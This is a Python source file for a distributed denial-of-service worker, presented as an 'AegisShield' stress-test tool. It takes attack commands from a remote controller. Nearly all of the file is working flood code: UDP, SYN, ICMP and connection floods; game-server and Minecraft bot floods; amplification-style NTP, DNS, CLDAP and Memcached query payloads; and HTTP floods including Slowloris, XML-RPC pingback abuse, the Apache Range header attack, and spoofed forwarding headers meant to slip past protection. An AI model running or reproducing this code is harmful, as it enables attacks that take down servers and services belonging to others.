#!/usr/bin/env python3
"""
AegisShield Stress Test Worker v4.0 (ULTIMATE)
=======================================================
Connects to a controller and executes attack commands.
Supports all 46 methods (L4 + L7) with multiprocessing + threading.

Usage:
    python worker.py --master <CONTROLLER_IP>:7777
"""

import socket
import ssl
import threading
import multiprocessing
import json
import time
import random
import argparse
import http.client
import sys
import os
import struct
import urllib.parse

# ══════════════════════════════════════════════════════════════════
#  Protocol Payloads — synced with start.py
# ══════════════════════════════════════════════════════════════════
UDP_PAYLOADS = {
    "VSE":    b'\xff\xff\xff\xffTSource Engine Query\x00',
    "TS3":    b'\x05\xca\x7f\x16\x9c\x11\xe9\x89\x00\x00\x00\x00\x02',
    "FIVEM":  b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00',
    "FIVEM-TOKEN": b'\xff\xff\xff\xffgetstatus\x00',
    "MEM":    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
    "NTP":    b'\x17\x00\x03\x2a' + b'\x00' * 44,
    "MCPE":   b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    "DNS":    b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x69\x73\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
    "CHAR":   b'\x01',
    "CLDAP":  b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
    "ARD":    b'\x00\x14\x00\x00\x00\x00\x00\x00',
    "RDP":    b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00',
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

LAYER4_METHODS = {
    "UDP", "TCP", "SYN", "ICMP", "CPS", "CONNECTION",
    "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
    "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
    "MCBOT", "MINECRAFT",
}

LAYER7_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "GSB", "DGB", "AVB", "APACHE", "XMLRPC", "BOT",
    "BOMB", "DOWNLOADER", "KILLER", "PPS", "EVEN", "RHEX", "STOMP",
    "NULL", "COOKIE",
}


# ══════════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════════

def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rand_str(length=12):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))


# ══════════════════════════════════════════════════════════════════
#  Minecraft Protocol — synced with start.py
# ══════════════════════════════════════════════════════════════════

class MC:
    @staticmethod
    def varint(d):
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += struct.pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload):
        payload = b''.join(payload)
        return MC.varint(len(payload)) + payload

    @staticmethod
    def handshake(host, port, protocol=47, state=1):
        return MC.data(
            MC.varint(0x00), MC.varint(protocol),
            MC.data(host.encode()), struct.pack('>H', port), MC.varint(state)
        )

    @staticmethod
    def login(username):
        if isinstance(username, str):
            username = username.encode()
        return MC.data(MC.varint(0x00), MC.data(username))

    @staticmethod
    def chat(message):
        return MC.data(MC.varint(0x01), MC.data(message.encode()))

    @staticmethod
    def ping():
        return MC.data(b'\x00')


# ══════════════════════════════════════════════════════════════════
#  Worker class — connects to controller
# ══════════════════════════════════════════════════════════════════

class StressWorker:
    def __init__(self, master_host, master_port):
        self.master_host = master_host
        self.master_port = master_port
        self.sock = None
        self.stop_flag = threading.Event()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.master_host, self.master_port))
                print(f"  ✅ Connected to controller {self.master_host}:{self.master_port}")
                return
            except (ConnectionRefusedError, OSError) as e:
                print(f"  ⏳ Retrying in 3s... ({e})")
                time.sleep(3)

    def send_msg(self, msg):
        try:
            self.sock.sendall(json.dumps(msg).encode())
        except (BrokenPipeError, OSError):
            pass

    def listen(self):
        buffer = ""
        while True:
            try:
                data = self.sock.recv(4096)
                if not data:
                    raise ConnectionResetError("Disconnected")
                buffer += data.decode()
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)
                    if line.strip():
                        self.handle_command(json.loads(line))
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                print(f"  ❌ Lost connection: {e}")
                self.stop_flag.set()
                time.sleep(2)
                self.connect()
                buffer = ""
            except json.JSONDecodeError:
                pass

    def handle_command(self, msg):
        cmd = msg.get("cmd")
        if cmd == "stop":
            print("  🛑 Stop received")
            self.stop_flag.set()
        elif cmd == "attack":
            self.stop_flag.clear()
            threading.Thread(
                target=self.run_attack, args=(msg,), daemon=True
            ).start()

    def run_attack(self, msg):
        method = msg["method"]
        target = msg["target"]
        port = msg.get("port", 0)
        threads = msg.get("threads", 100)
        duration = msg.get("duration", 60)
        power = msg.get("power", 100)
        layer = msg.get("layer", 4 if method in LAYER4_METHODS else 7)

        print(f"  🔥 {method} → Layer {layer} | Power: {power}%")

        if layer == 4:
            self._run_l4_attack(target, port, method, threads, duration, power)
        else:
            self._run_l7_attack(target, method, threads, duration, power)

    # ──── L4 ATTACK DISPATCHER ────────────────────────────────────

    def _run_l4_attack(self, target, port, method, threads, duration, power):
        max_cpus = os.cpu_count() or 4
        num_procs = max(1, int(max_cpus * (power / 100.0)))
        threads_per_proc = max(1, threads // num_procs)

        print(f"     Target: {target}:{port} | {duration}s | Procs: {num_procs} | Threads/proc: {threads_per_proc}")

        counter = multiprocessing.Value('q', 0)
        stop = multiprocessing.Event()
        procs = []

        udp_methods = {"UDP", "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
                        "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP"}
        tcp_methods = {"TCP", "SYN", "CPS", "CONNECTION", "MCBOT", "MINECRAFT"}

        for _ in range(num_procs):
            if method in udp_methods:
                p = multiprocessing.Process(
                    target=_udp_process,
                    args=(target, port, method, duration, counter, stop, threads_per_proc), daemon=True)
            elif method == "ICMP":
                p = multiprocessing.Process(
                    target=_icmp_process,
                    args=(target, duration, counter, stop, threads_per_proc), daemon=True)
            elif method in tcp_methods:
                p = multiprocessing.Process(
                    target=_tcp_process,
                    args=(target, port, method, duration, counter, stop, threads_per_proc), daemon=True)
            else:
                continue
            p.start()
            procs.append(p)

        self._monitor(time.time(), duration, counter, method, procs, stop)

    # ──── L7 ATTACK DISPATCHER ────────────────────────────────────

    def _run_l7_attack(self, url_str, method, threads, duration, power):
        if not url_str.startswith("http"):
            url_str = "http://" + url_str

        url_obj = urllib.parse.urlparse(url_str)
        use_ssl = url_obj.scheme == "https"
        thread_count = max(1, int(threads * (power / 100.0)))

        print(f"     Target: {url_str} | {method} | {duration}s | Threads: {thread_count}")

        counter = multiprocessing.Value('q', 0)
        stop = threading.Event()

        thread_list = []
        for _ in range(thread_count):
            t = threading.Thread(
                target=_l7_http_worker,
                args=(url_obj, method, duration, counter, stop, use_ssl), daemon=True)
            t.start()
            thread_list.append(t)

        start_time = time.time()
        try:
            while time.time() - start_time < duration and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start_time, 0.1)
                sent = counter.value
                rps = sent / elapsed
                self.send_msg({"type": "stats", "sent": sent,
                               "pps": round(rps), "mbps": 0, "method": method})
                print(f"  📊 {method} | {sent:,} reqs | {rps:,.0f} req/s")
        except KeyboardInterrupt:
            pass

        stop.set()
        if self.stop_flag.is_set():
            stop.set()
        for t in thread_list:
            t.join(timeout=2)

        total = counter.value
        elapsed = max(time.time() - start_time, 0.1)
        self.send_msg({"type": "done", "total": total, "duration": round(elapsed, 1)})
        print(f"  ✅ {method} done. {total:,} requests in {elapsed:.1f}s")

    # ──── MONITORING ──────────────────────────────────────────────

    def _monitor(self, start_time, duration, counter, method, procs, stop):
        try:
            while time.time() - start_time < duration and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start_time, 0.1)
                sent = counter.value
                pps = sent / elapsed

                if method in UDP_PAYLOADS:
                    avg_size = len(UDP_PAYLOADS[method])
                elif method == "OVH-UDP":
                    avg_size = 600
                elif method in {"SYN", "CPS", "ICMP"}:
                    avg_size = 64
                elif method in {"CONNECTION", "MCBOT", "MINECRAFT"}:
                    avg_size = 128
                else:
                    avg_size = 2048

                mbps = sent * avg_size * 8 / elapsed / 1_000_000
                self.send_msg({"type": "stats", "sent": sent,
                               "pps": round(pps), "mbps": round(mbps, 1), "method": method})
                print(f"  📊 {method} | {sent:,} pkts | {pps:,.0f} pps | {mbps:,.1f} Mbps")
        except KeyboardInterrupt:
            pass

        stop.set()
        for p in procs:
            p.join(timeout=3)
            if p.is_alive():
                p.terminate()

        total = counter.value
        elapsed = max(time.time() - start_time, 0.1)
        self.send_msg({"type": "done", "total": total, "duration": round(elapsed, 1)})
        print(f"  ✅ {method} done. {total:,} pkts in {elapsed:.1f}s")


# ══════════════════════════════════════════════════════════════════
#  Process-level workers (run in separate processes)
# ══════════════════════════════════════════════════════════════════

def _udp_process(target, port, method, duration, counter, stop_event, thread_count=16):
    end_time = time.time() + duration
    BATCH = 50

    def sender():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        except Exception:
            pass

        static_payload = UDP_PAYLOADS.get(method)
        c = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                if static_payload:
                    payload = static_payload
                elif method == "OVH-UDP":
                    payload = (random.choice([b"GET", b"POST", b"HEAD"]) +
                               b" / HTTP/1.1\r\nHost: " + rand_str(8).encode() +
                               b"\r\n\r\n" + random.randbytes(random.randint(64, 1024)))
                else:
                    payload = random.randbytes(random.randint(512, 65507))
                s.sendto(payload, (target, port))
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
            except OSError:
                pass
        with counter.get_lock():
            counter.value += c % BATCH
        s.close()

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=sender, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _tcp_process(target, port, method, duration, counter, stop_event, thread_count=16):
    end_time = time.time() + duration
    BATCH = 5

    def connector():
        c = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if method == "SYN":
                    s.setblocking(False)
                    try:
                        s.connect((target, port))
                    except (BlockingIOError, InterruptedError, OSError):
                        pass
                    s.close()
                    c += 1
                elif method == "CPS":
                    s.settimeout(2)
                    s.connect((target, port))
                    s.close()
                    c += 1
                elif method == "CONNECTION":
                    s.settimeout(5)
                    s.connect((target, port))
                    s.sendall(b"X")
                    time.sleep(random.uniform(0.3, 1.0))
                    s.close()
                    c += 1
                elif method == "MCBOT":
                    s.settimeout(3)
                    s.connect((target, port))
                    username = f"Bot_{rand_str(5)}"
                    s.sendall(MC.handshake(target, port, 47, 2))
                    s.sendall(MC.login(username))
                    time.sleep(1)
                    s.sendall(MC.chat(f"/register {rand_str(6)} {rand_str(6)}"))
                    for _ in range(5):
                        if stop_event.is_set(): break
                        s.sendall(MC.chat(rand_str(128)))
                        time.sleep(0.5)
                    s.close()
                    c += 1
                elif method == "MINECRAFT":
                    s.settimeout(3)
                    s.connect((target, port))
                    s.sendall(MC.handshake(target, port, 47, 1))
                    s.sendall(MC.ping())
                    s.close()
                    c += 1
                else:  # TCP
                    s.settimeout(2)
                    s.connect((target, port))
                    s.sendall(random.randbytes(random.randint(256, 4096)))
                    s.close()
                    c += 1

                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
            except OSError:
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
        with counter.get_lock():
            counter.value += c % BATCH

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=connector, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _icmp_process(target, duration, counter, stop_event, thread_count=4):
    end_time = time.time() + duration
    BATCH = 10

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except OSError as e:
        print(f"  [!] ICMP requires root/admin: {e}")
        return

    def checksum(data):
        s_sum = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s_sum += data[i] + (data[i + 1] << 8)
        if n:
            s_sum += data[-1]
        while (s_sum >> 16):
            s_sum = (s_sum & 0xFFFF) + (s_sum >> 16)
        return ~s_sum & 0xFFFF

    header = struct.pack('bbHHh', 8, 0, 0, 1, 1)
    data = b'AegisShield ICMP Stress ' * 2
    chk = checksum(header + data)
    header = struct.pack('bbHHh', 8, 0, socket.htons(chk), 1, 1)
    packet = header + data

    def pinger():
        c = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                s.sendto(packet, (target, 1))
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
            except OSError:
                pass
        with counter.get_lock():
            counter.value += c % BATCH

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=pinger, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


# ══════════════════════════════════════════════════════════════════
#  L7 HTTP Worker — synced with start.py methods
# ══════════════════════════════════════════════════════════════════

def _l7_http_worker(url_obj, method, duration, counter, stop_event, use_ssl=False):
    end_time = time.time() + duration
    host = url_obj.hostname
    port = url_obj.port or (443 if use_ssl else 80)
    path = url_obj.path or "/"

    while time.time() < end_time and not stop_event.is_set():
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(host, port, timeout=5, context=ctx)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=5)

            ua = random.choice(USER_AGENTS)
            headers = {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "X-Forwarded-For": rand_ip(),
                "X-Real-IP": rand_ip(),
            }

            if method == "POST":
                body = '{"data": "%s"}' % rand_str(random.randint(32, 256))
                headers["Content-Type"] = "application/json"
                conn.request("POST", path, body=body, headers=headers)
            elif method == "HEAD":
                conn.request("HEAD", path, headers=headers)
            elif method == "PPS":
                conn.request("GET", path, headers={"User-Agent": ua, "Host": host})
            elif method == "STRESS":
                body = '{"data": "%s"}' % rand_str(512)
                headers["Content-Type"] = "application/json"
                conn.request("POST", path, body=body, headers=headers)
            elif method == "SLOW":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if use_ssl:
                    ctx2 = ssl.create_default_context()
                    ctx2.check_hostname = False
                    ctx2.verify_mode = ssl.CERT_NONE
                    s = ctx2.wrap_socket(s, server_hostname=host)
                s.connect((host, port))
                s.send(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n".encode())
                while time.time() < end_time and not stop_event.is_set():
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    with counter.get_lock():
                        counter.value += 1
                    time.sleep(random.uniform(5, 15))
                s.close()
                continue
            elif method == "XMLRPC":
                body = ("<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName>"
                        "<params><param><value><string>%s</string></value></param>"
                        "<param><value><string>%s</string></value></param></params></methodCall>" %
                        (rand_str(64), rand_str(64)))
                headers["Content-Type"] = "application/xml"
                conn.request("POST", "/xmlrpc.php", body=body, headers=headers)
            elif method == "BYPASS":
                conn.request("GET", path, headers=headers)
            elif method == "CFB":
                headers["Sec-Fetch-Dest"] = "document"
                headers["Sec-Fetch-Mode"] = "navigate"
                headers["Upgrade-Insecure-Requests"] = "1"
                conn.request("GET", path, headers=headers)
            elif method == "DYN":
                headers["Host"] = f"{rand_str(6)}.{host}"
                conn.request("GET", path, headers=headers)
            elif method == "NULL":
                headers["User-Agent"] = "null"
                conn.request("GET", path, headers=headers)
            elif method == "APACHE":
                range_hdr = ",".join(f"5-{i}" for i in range(1, 1024))
                headers["Range"] = f"bytes=0-,{range_hdr}"
                conn.request("GET", path, headers=headers)
            elif method == "BOT":
                headers["User-Agent"] = random.choice(USER_AGENTS[-2:])
                conn.request("GET", "/robots.txt", headers=headers)
            elif method == "GSB":
                conn.request("HEAD", f"{path}?qs={rand_str(6)}", headers=headers)
            elif method == "RHEX":
                conn.request("GET", f"{path}/{rand_str(random.choice([32, 64, 128]))}", headers=headers)
            elif method == "COOKIE":
                headers["Cookie"] = f"_ga=GA{random.randint(1000, 99999)}; {rand_str(6)}={rand_str(32)}"
                conn.request("GET", path, headers=headers)
            elif method == "EVEN":
                conn.request("GET", path, headers=headers)
                try: conn.getresponse()
                except: pass
            elif method == "OVH":
                for _ in range(3):
                    conn.request("GET", path, headers=headers)
            elif method == "STOMP":
                hex_path = rand_str(128)
                headers["Host"] = f"{host}/{hex_path}"
                conn.request("GET", f"/{hex_path}", headers=headers)
            elif method == "KILLER":
                for _ in range(10):
                    conn.request("GET", path, headers=headers)
            elif method == "DOWNLOADER":
                conn.request("GET", path, headers=headers)
                try:
                    resp = conn.getresponse()
                    resp.read()
                except: pass
            elif method == "BOMB":
                for _ in range(10):
                    conn.request("GET", path, headers=headers)
            elif method == "AVB":
                conn.request("GET", path, headers=headers)
                time.sleep(max(1, random.random()))
            elif method == "DGB":
                conn.request("GET", path, headers=headers)
            elif method == "CFBUAM":
                conn.request("GET", path, headers=headers)
                time.sleep(5)
                for _ in range(3):
                    conn.request("GET", path, headers=headers)
            else:
                conn.request("GET", path, headers=headers)

            try: conn.getresponse()
            except: pass
            conn.close()

            with counter.get_lock():
                counter.value += 1
        except Exception:
            with counter.get_lock():
                counter.value += 1


# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

BANNER = """
    \033[91m
    ╔═══════════════════════════════════════════════════════════╗
    ║  ██     ██  ██████  ██████  ██   ██ ███████ ██████       ║
    ║  ██     ██ ██    ██ ██   ██ ██  ██  ██      ██   ██      ║
    ║  ██  █  ██ ██    ██ ██████  █████   █████   ██████       ║
    ║  ██ ███ ██ ██    ██ ██   ██ ██  ██  ██      ██   ██      ║
    ║   ███ ███   ██████  ██   ██ ██   ██ ███████ ██   ██      ║
    ╚═══════════════════════════════════════════════════════════╝\033[0m
    \033[96mAegisShield Stress Test Worker v4.0 (ULTIMATE)\033[0m
    \033[93m✦ 46 Methods | L4 + L7 | Distributed\033[0m
"""


def main():
    multiprocessing.freeze_support()

    parser = argparse.ArgumentParser(description="AegisShield Stress Test Worker v4.0")
    parser.add_argument("--master", required=True,
                        help="Controller address (e.g. 192.168.1.10:7777)")
    args = parser.parse_args()

    host, port = args.master.rsplit(":", 1)
    port = int(port)

    print(BANNER)
    cpus = os.cpu_count() or 4
    print(f"  💻 CPUs: {cpus}")
    print(f"  🎯 Connecting to controller: {host}:{port}\n")

    w = StressWorker(host, port)
    w.connect()
    w.listen()


if __name__ == "__main__":
    main()
